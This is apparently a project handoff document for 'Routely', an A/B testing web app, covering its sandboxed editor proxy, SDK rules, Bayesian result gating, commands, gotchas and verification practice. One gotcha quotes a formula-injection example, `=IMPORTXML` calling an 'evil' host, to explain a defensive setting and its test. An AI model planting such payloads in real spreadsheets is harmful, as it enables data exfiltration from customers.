popup flows end to end, a forged in-page message ignored, and the popup on a real WordPress site.
`/sdk/v1/editor-agent.js` is served `no-cache` (a later header rule overrides the immutable one).
The protocol is fully specified in `contract.ts`.

**Sites that refuse framing open through the page proxy** (`/api/editor/proxy`, user decision
2026-10-22, reversing D4's "no proxy"): when the direct frame gets no hello, the editor reloads the
frame with the session's `proxyUrl`. The route fetches the page with `safeFetch` (token-bound origin,
project domain, every redirect re-checked), strips the page's own Routely tags and blocking `<meta>`
(`lib/editor-proxy-html.ts`), adds `<base>` plus this app's snippet with `data-api`, and serves it with
`Content-Security-Policy: sandbox allow-scripts; frame-ancestors <app>` and `no-store`. **The
sandbox is the security boundary** (user request 2026-10-26: always edit in-screen, never the popup):
without `allow-same-origin` the copy has an opaque origin, so it is served from the **app's own
origin** with no second domain, yet customer scripts get no cookies, storage or same-origin access.
`proxyUrl` is **relative**, and the route reads the dashboard origin back from its own request
(`proxyDashboardOrigin`), so it works on whatever origin the dashboard was opened on — building it
from `NEXT_PUBLIC_APP_URL` broke local editing whenever that named an expired tunnel.
Never add `allow-same-origin` to the proxy's CSP or to the proxy-mode iframe. Messages from it arrive
with origin `"null"` and are answered with `targetOrigin "*"` to that frame only
(`use-editor-bridge.ts`). `EDITOR_PROXY_ORIGIN` is optional extra isolation. The popup remains only
for a page the proxy cannot fetch. Fidelity limits: fetched without the user's cookies (logged-out
view); the customer's scripts have no storage or cookies; web fonts and other CORS-gated assets may
not load.

**Local testing gotcha:** a public site loading the snippet from `http://localhost:3000` is blocked by
Chrome's Local Network Access unless the user allows it for that site — no SDK, no tracking, no
editor in the browser, while the server-side install check (which reads HTML) still passes.

### Three properties that govern every change here

1. **It never breaks the page.** Every failure path — no storage, no network, malformed
   response, blocked request — ends with the SDK doing nothing. Nothing throws into the host
   page; no promise is left to reject unhandled.
2. **It never blocks the page.** Loaded synchronously so a redirect can precede paint, but the
   work is async and never gates rendering.
3. **It carries no secret.** The only credential-shaped value is the public site id, visible in
   page source by design.

### Four redirect loop guards

Each sufficient on its own for the case it covers:

1. Only the **control** URL is a trigger; the variant is never matched
2. Already on the variant — catches a variant nested under a `PREFIX` control
3. Arrived by this experiment's own redirect (handoff params) — works across origins
4. A **pending-redirect marker** in `sessionStorage`, written **before** navigating and cleared when
   the visitor lands on the variant (`markLanded`). Back on the control with it still set (< 30 s),
   the redirect never landed — the variant bounced back — so it is not repeated. It replaced a
   counter capped at one redirect per tab session (2026-10-23), which sent a returning visitor to
   the *control* page while reporting their events for their variant

Plus a final check that the target is not the page already displayed. `location.replace()`, not
`assign`, so Back does not bounce.

### `lib/url.ts` is duplicated on purpose

`apps/web/src/lib/url.ts` and `packages/sdk/src/url.ts` implement the same normalisation. The
SDK cannot import from the app, and a shared package would add a module graph to a bundle whose
whole point is being one small file. **Both have mirrored test suites — change both together.**

### Time on page is approximate, and must be labelled so

The browser reports *document visibility*, not attention. A tab open on a monitor nobody is
watching counts; time after the last beacon is lost. It is meaningful **as a comparison between
two arms** (shared bias cancels), never as a session-duration figure. See
`docs/SDK-DEPLOYMENT.md`.

### Results claims: Bayesian chance to beat Control, gated, in one module

**This replaces the earlier "no statistical significance claims" rule — approved by the user on
2026-10-19 (decision D1)** so the design's results could be built as drawn: "Chance to beat
Control", "Likely better" / "Likely worse", "Winner".

- **One pure module, `lib/verdict.ts`.** Every screen that names a result — experiments list,
  project dashboard, detail page, both wizard result phases, the share page, the result-ready
  email — calls it (`analyzeResults`, `chanceToBeatControl`, `experimentVerdict`, `rowVerdict`,
  `resultNote` …). Do not compute a rate, lift or chance anywhere else.
- **The quantity is Bayesian**: P(p_variant > p_control) under independent
  Beta(1 + conversions, 1 + visitors − conversions) posteriors. Not the design's two-proportion
  z-score Φ(z), which is not a chance.
- **The gate**: nothing is named until *every* arm has **1,000 assigned visitors and 100
  conversions** (`MIN_VISITORS_PER_ARM`, `MIN_CONVERSIONS_PER_ARM`). Then ≥ **0.95** is likely
  better / the winner, ≤ **0.05** likely worse (`WIN_CHANCE`, `LOSE_CHANCE`).
- **"Not proof"**: `NOT_PROOF_NOTE` is rendered under results wherever a chance, a "likely" or a
  winner appears. The design's "roll out <W>" says "update your site to <W>" — Routely cannot roll
  anything out.

Do not lower the gate, add a p-value or drop the note without asking. Deciding whenever the
numbers look good is wrong regardless of the statistics behind it, which is what the note says.

---

## 8. Commands

```bash
npm install
cp .env.example apps/web/.env      # BOTH Next.js and the Prisma CLI read apps/web/.env
npm run db:up                      # Postgres in Docker
npm run db:migrate
npm run db:seed                    # optional; idempotent — the design's demo workspace (below)
npm run dev                        # http://localhost:3000

npm run check                      # typecheck + lint + format:check + tests — run before finishing
npm run build                      # builds the SDK first, then the app
npm run db:verify                  # 26-check data-model smoke test against live Postgres
npm run sdk:build                  # size-budgeted SDK build (8 kB gzip)
npm run sheets:sync -- --dry-run --day 2026-09-28 --user <id>   # print rows, write nothing
npm run sheets:sync -- --website <id>                           # refresh one website now
npm run sheets:sync                # the real sweep (needs TOKEN_ENCRYPTION_KEY)

# The two crons, by hand (both refuse without CRON_SECRET; both are idempotent)
curl -H "Authorization: Bearer $CRON_SECRET" localhost:3000/api/cron/sheets-sync
curl -H "Authorization: Bearer $CRON_SECRET" localhost:3000/api/cron/notifications
```

**The seed is the design's demo workspace**, "Fernwood Group": five members (one per role, two
Editors), a pending invite, three projects, all seventeen experiments with variants, visual changes,
activity and traffic, and 90 days of site visitors — timeline shifted so the design's "now" is the
moment the seed runs (run it again to bring relative readings back). Every demo account signs in
with the password **`fernwood-demo-2026`**: `alex@fernwoodsupply.com` (Owner),
`jamie@fernwoodsupply.com` (Admin), `priya@fernwoodsupply.com` and `marcus@northbeamstudio.com`
(Editors), `dana@fernwoodsupply.com` (Viewer). Local data only — the seed refuses a non-local
`DATABASE_URL`, and the password is printed at the end of every run.

**Local and production are configured independently and need no switching.** `apps/web/.env`
holds local values only; production values live in the Vercel project's environment variables,
and `.vercelignore` keeps every `.env` off the build machine. `env.ts` derives `AUTH_URL` and
`NEXT_PUBLIC_APP_URL` from `VERCEL_PROJECT_PRODUCTION_URL` when they are unset, so a deployment
cannot inherit a localhost value.

`db:reset` and `db:seed` run `scripts/assert-local-db.mjs` first, which aborts unless
`DATABASE_URL` resolves to a local host. `.env` did once point at production Neon — with a
duplicate `DATABASE_URL` line, so the local one *looked* right while the second silently won —
which aimed a command that drops every table at production data. `db:deploy` is deliberately
**not** guarded: that is how Vercel applies migrations during `vercel-build`.

Tests: **720** — 192 in the SDK (15 files), 528 in the app (45 files), counted by running both
suites on 2026-10-22. Both run under Vitest in a Node environment. (Earlier revisions said 129 and
then 264; recount rather than trusting this figure.)

Email locally: leave `RESEND_API_KEY` unset and every email — verification, reset, invite,
notifications — is printed to the `npm run dev` console with its links, so each flow can be finished
by hand. `EDITOR_TOKEN_SECRET` is optional (derived from `AUTH_SECRET` under a fixed label when unset).

---

## 9. Gotchas that will cost you time

Every one of these was hit at least once during the build.

**Restart `npm run dev` after any `prisma generate`.** `db.ts` caches the client on
`globalThis` across hot reloads (correct for connection pooling), so a regenerated client is
**not** picked up. Symptom: `The column X does not exist in the current database` or
`PrismaClientValidationError` on a field you just added. This bit the build three separate
times.

**Prisma cannot rename a column — or an enum value.** Its diff sees a drop plus an add and
recreates the column empty (or recreates the enum and casts rows to a value that no longer exists).
Several migrations here are hand-written `RENAME COLUMN`s, and `20261019120000` also renames the
enum value `ARCHIVED` → `COMPLETED` in place and backfills workspaces before making
`workspaceId` NOT NULL. Check `prisma/migrations/*/migration.sql` before committing any migration —
that file is what runs in production, not the schema.

**`server-only` throws under Vitest.** `apps/web/vitest.config.mts` aliases it to the package's
own `empty.js`. Do not remove that alias, and do not weaken the guard in the app build.

**Next.js 16 renamed things.** Middleware is now `proxy.ts`. `PageProps<'/route'>` and
`LayoutProps<'/route'>` are generated globals — this codebase uses explicit prop types instead,
so `tsc --noEmit` works without a prior build. The `eslint` key in `next.config.ts` no longer
exists. Bundled docs are at `node_modules/next/dist/docs/`.

**`useActionState` uses a different progressive-enhancement encoding** than a bare Server Action
form: `$ACTION_REF_n` / `$ACTION_n:0` / `$ACTION_KEY`, not `$ACTION_ID_<hex>`. Matters if you
write a harness that replays forms.

**Prettier reflows JSX text.** A `python .replace()` against text you wrote earlier will
silently no-op after formatting. **Always `assert old in s` before replacing.** Two edits were
lost this way and only caught by lint reporting unused imports.

**`notFound()` behind a Suspense boundary returns HTTP 200, not 404.** The boundary flushes the
shell and commits the status before `notFound()` runs. The `(app)` `loading.tsx` files that caused
this originally are gone, but the dashboard, Projects and the project dashboard stream their bodies
behind `<Suspense>`, and a `notFound()` inside one has the same property (not re-measured after the
wiring). The not-found *page* renders correctly and no data leaks — only the status code is wrong.
Verify authorization by asserting on content, not on `=== 404`.

**React splits `{value} text` into separate text nodes.** `grep "50 / 50"` fails on markup that
renders correctly. Use a tolerant pattern when asserting against HTML.

**`vm` contexts have no `URL`.** It is a Web API, not an ECMAScript built-in. Supply it when
running the SDK bundle in a sandbox.

**A `tsx` script cannot import anything under `src/server` without
`--conditions=react-server`.** Those modules begin `import "server-only"`, whose whole job is to
throw outside an RSC bundler; Node resolves that package's `react-server` export condition to a
no-op. `npm run sheets:sync` does this, and also needs `import "dotenv/config"` *first* so `env.ts`
has a `DATABASE_URL` to validate. `prisma/seed.ts` and `prisma/verify.ts` avoid the problem
entirely by building their own Prisma client and importing nothing from `src/`.

**`server-only` is also why `server/crypto.ts` and `lib/secret-box.ts` are split.** The cipher
takes an explicit key and reads no configuration, so it is unit-testable; anything importing `env`
fails under Vitest on a missing `DATABASE_URL` it never uses. Put pure logic in `lib/`, the
configured wrapper in `server/`.

**The Google Picker is why the scopes can stay non-sensitive.** It needs
`NEXT_PUBLIC_GOOGLE_API_KEY` and `NEXT_PUBLIC_GOOGLE_PROJECT_NUMBER` (the Cloud project *number*,
i.e. the digits before the dash in the client id) — without the latter, a picked file is never
associated with the app and the write that follows 404s. In the Google console, *Authorized redirect
URIs* and *Authorized JavaScript origins* are **different fields** and both are needed.

**The Sheets tab is rewritten from source, not appended to.** Every refresh recomputes the last 30
days and overwrites one tab, which is why there is no claim mechanism: overwriting is idempotent, so
a duplicated run writes the same cells. An earlier design appended completed days to one tab and kept
today in another; it put the same date in two places with different numbers and was replaced. Routely
creates and owns the tab (`Routely`) — the customer picks a *spreadsheet*, because a full overwrite
aimed at a tab holding their own work would destroy it.

**The Sheets refresh is triggered by traffic but throttled, never per-event.** Google allows 60
write requests per minute per user, which a write-per-page-view would exceed at about one visitor a
second. `/api/v1/events` schedules `refreshSheet` with Next's `after()` so it runs *after* the
response — ingestion must stay fast and must never fail because a spreadsheet is unreachable, so
that function swallows every error. The throttle is a compare-and-set on
`WebsiteSheetTarget.refreshedAt`; do not replace it with a read-then-write, or concurrent
beacons will each fire a write. 

**Sheets rows must be written with `valueInputOption=RAW`.** `USER_ENTERED` parses a leading `=`
as a formula, and experiment names are customer-controlled text — so a name like
`=IMPORTXML("http://evil/",…)` would become a live formula in the customer's spreadsheet. There is
a test asserting a formula-shaped name passes through verbatim; if it fails, read the comment
beside it before "fixing" it.

**Prisma logs expected unique violations at error level.** The `sheets_sync_runs` claim table that
used to produce them is gone, but the partial unique indexes (§6) do the same when a race is lost —
e.g. a second RESULT_READY activity or a duplicate pending invite. That is the constraint working,
not a bug; it is not suppressed because silencing it would silence real constraint errors too.

**Do not `pkill -f "next dev"`.** The pattern matches the wrapper shell running the command and
kills your own process. Use `pkill -f "[n]ext-server"`, narrowed by port when several run.

**Next 16 refuses a second `next dev` in the same app.** While the user's server is on :3000, a
second dev server in `apps/web` will not start. Test with `npm run build` and
`npx next start -p 31xx` (in `apps/web`), stop it by PID — and run only one `npm run build` at a
time, since they share `apps/web/.next`.

**`next start` is `NODE_ENV=production`, and that changes behaviour.** `server/http/safe-fetch.ts`
refuses private addresses and `*.localhost` unless `NODE_ENV !== "production"`, so pixel and tracking
checks against a local test site fail under `next start` that pass under `next dev`. Email is the
other one: with no `RESEND_API_KEY`, production **withholds** the body (its links are bearer
tokens) instead of printing it, so a local `next start` cannot finish a sign-up or reset by console.

**Production functions must run in the database's region.** `vercel.json` pins `regions: ["sin1"]`
because the production Neon database is in `ap-southeast-1`. On the default `iad1` every query
crossed the Pacific (~220 ms) and pages took 2–6 s. `relationJoins` (in `schema.prisma`) and the
serverless pool of 5 (`db.ts`) keep each page to a handful of sequential round trips; a
`Promise.all` is only parallel if the pool has the connections for it.

**This branch uses its own database.** `new-design`'s `apps/web/.env` points at the local database
`routely_design`; the local `routely` database belongs to the older dev branch and must not be
touched (or migrated, seeded or reset) from here. `.env.example` still names `routely`.

**The fixed app shell is a stacking context.** Anything that must sit above a dialog overlay —
toasts especially — has to portal to `<body>`. `components/rt/toast.tsx`'s `ToastHost` does; a toast
rendered inside the shell sat under the overlay on `/projects`.

**A server page must not import values from a `"use client"` module.** Types are fine; a constant
or function arrives as a client reference, not the value. Put shared constants in a plain `lib/`
module (`lib/dashboard.ts`, `lib/project-dashboard.ts` exist for this).

**`/tmp` is a size-limited tmpfs** (per-user quota). A headless Chrome profile filled it once.
Create browser profiles and scratch files under your session's scratchpad directory and delete
them when done.

---

## 10. How verification is done here

The user expects each part to be verified against a **running server and a real database**, not
by assertion. The pattern used throughout:

1. Seed fixtures with a throwaway script — in the session's scratchpad, not the repo (earlier
   parts used `prisma/_setupN.ts`)
2. Drive the real HTTP surface — find each form in the rendered page and replay its hidden
   fields exactly as a browser with JavaScript disabled would
3. Assert on rendered content and on database rows
4. **Delete the fixtures and the scratch scripts afterwards**
5. Run `npm run check` and `npm run build`

Two-user authorization checks are standard: create a second user, replay the first user's form
with the second user's session, and confirm nothing changed. With workspaces that is two checks:
a user from **another workspace** must get not-found and change nothing, and a **member with too
low a role** (a Viewer replaying an Editor's form) must get FORBIDDEN and change nothing. The demo
seed's five accounts cover every role.

**Report failures honestly, including your own harness bugs.** Several "failures" during the
build were bad assertions rather than bad code — say so rather than quietly fixing the test.

---

## 11. Build status

**All ten designed screens run on real data** (Sign in, Dashboard, Projects, Project dashboard,
Experiments, Experiment results & review, A/B test wizard, Split URL wizard, Integrations,
Settings), plus the undesigned sign-up, forgot/reset password, verify-email and invite pages.

Working:

- **Accounts** — Google and email + password sign-in on database sessions; sign-up (with invite);
  email verification (24 h link; unverified password accounts see a banner with "Resend link");
  forgot/reset password (1 h, signs out everywhere); profile with email change confirmed from the new
  inbox; set/change password; "Where you're signed in" with revoke; new-device sign-in email;
  notification preferences. Rate limits on password sign-in, sign-up, reset, password change and
  every "resend link" (Google sign-in has none of its own).
- **Workspaces and team** — personal workspace on sign-up; roles OWNER/ADMIN/EDITOR/VIEWER
  enforced in every query; invites by email (7 days, up to 10 per batch, 50 a day per workspace),
  resend, revoke, change role, remove; invite-aware Google and password sign-up; workspace switcher.
- **Projects** — create/edit/delete with the domain and name rules; install snippet and pixel
  verification; tracking status from the site-wide hit; daily visitors and sparklines.
- **Experiments** — Split URL (≤ 4 variants, device targeting, keep query params) and A/B test
  (visual changes) wizards with draft autosave and resume; launch with inline tracking checks;
  pause, resume, end; activity log; results and review with the gated Bayesian verdict (§7); public
  share links; experiments list.
- **SDK v4** — split-URL redirects, A/B visual changes with the overlay held until applied, device
  targeting, `keepParams`, site-wide hit, editor bridge handshake; v3 fallback for installed bundles.
- **Email** — 11 templates through Resend; four opt-out notifications (result ready, tracking
  stops, Sheets sync fails, experiment paused) with role floors and per-user preferences.
- **Google Sheets export** — one grant per workspace, one spreadsheet per website, chosen through
  the Picker (connector only) or created by Routely; a single tab with the last 30 days, rewritten
  within seconds of a visit or conversion and daily; failure latch and email.
- **Crons** — Sheets refresh (00:20 UTC) and notifications (00:40 UTC: result-ready backstop,
  tracking-stopped alerts, 400-day retention of the visitor-day tables).
- **Demo seed** of the design's workspace (§8).

**Not built:** workspace rename, ownership
transfer, leaving a workspace and deleting an account (`workspace.manage` exists in the matrix with
no action behind it) · the production Docker Compose
stack and Dockerfile (only `docker-compose.dev.yml` and reference Nginx configs exist) · click /
custom-JS / form goals · SPA route-change tracking · retention for experiment data (events,
assignments, conversions) · Google profile name/picture on the Sheets card (would need the
`userinfo.profile` scope — a question for the user).

Known limitations are listed at the end of each `docs/*.md`. The most significant:

- **Rate limits and throttles are per-process** — every `rateLimit()` (sign-in, sign-up, reset,
  ingestion, editor tokens) and the one-minute result-ready check throttle live in memory, so
  multiple instances multiply them. The latches and the Sheets refresh throttle are database
  compare-and-sets and are *not* affected.
- **Both crons are daily.** On Vercel Hobby a cron can run at most once a day and fires somewhere
  within its hour, so "tracking stopped" can lag an outage by up to a day and the result-ready
  backstop likewise. Check the current plan limits.
- **The first production cron run will announce a burst of results.** `resultReadyAt` is null on
  every experiment that existed before the migration, so the first notifications sweep latches and
  emails every ACTIVE experiment whose arms already pass the gate, all at once.
- **The visual editor's popup fallback needs `window.opener`.** A customer page that sends
  `Cross-Origin-Opener-Policy: same-origin` severs it, so a site that both forbids framing and sets
  COOP cannot be edited at all (unverified against a real site).
- **Google name and picture are null** on the Sheets card: the grant's scopes (`openid`,
  `userinfo.email`, `drive.file`) do not include `profile`, so the UI falls back to the email.
- **Conversions are per-origin** — the assignment lives in `localStorage`, so a goal page on a
  different origin from where the visitor was assigned will not convert
- **Redirect flicker is bounded, not eliminated** — the pasted anti-flickering script lifts
  after `routelyTimeout` (1250 ms), so a config request slower than that still flashes the
  control page. Sites that skip that script keep the flicker entirely. An A/B variant's overlay
  is bounded the same way.
- **Device targeting and every other browser-side decision can be forged** by a modified client;
  it only ever moves that client's own numbers.

---

## 12. Working style the user expects

- **Verify, do not assert.** Run it against real infrastructure and show the output.
- **Explain the reasoning behind a decision**, especially where an obvious alternative was
  rejected — and say which alternative and why.
- **Flag deviations from the spec explicitly** rather than silently doing something different.
  Several parts deviated for good reasons; each was called out and offered for reversal.
- **Report what failed**, including mistakes in your own test harness.
- **Do not over-build.** Each part had a scope, and "do not implement X yet" was honoured.
- Finish with: files changed, how to test, environment variables, and known limitations.
